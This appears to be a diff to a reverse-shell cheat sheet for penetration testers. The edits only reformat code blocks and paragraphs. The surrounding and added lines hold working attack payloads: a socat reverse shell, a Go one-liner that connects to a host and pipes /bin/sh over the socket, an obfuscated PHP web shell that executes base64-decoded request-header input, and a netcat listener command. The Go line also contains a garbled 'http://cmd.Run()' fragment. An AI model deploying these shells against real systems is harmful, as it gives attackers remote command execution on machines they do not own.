@@ -79,7 +79,7 @@ socat tcp:ip:port exec:'bash -i' ,pty,stderr,setsid,sigint,sane &
 
 ## Golang Reverse Shell
 
-{% highlight bash %}
+{% highlight go %}
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}'>/tmp/sh.go&&go run /tmp/sh.go
 {% endhighlight %}
 
@@ -100,13 +100,15 @@ Another PHP reverse shell (that was submitted via Twitter):
 
 Base64 encrypted by @0xInfection: 
 
+```
 <?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
+```
 
 ## Netcat Reverse Shell
 
-Useful netcat reverse shell examples:
+<p>Useful netcat reverse shell examples:</p>
 
-Don't forget to start your listener, or you won't be catching any shells :) 
+<p>Don't forget to start your listener, or you won't be catching any shells :) </p>
 
 {% highlight bash %}
 nc -lnvp 80
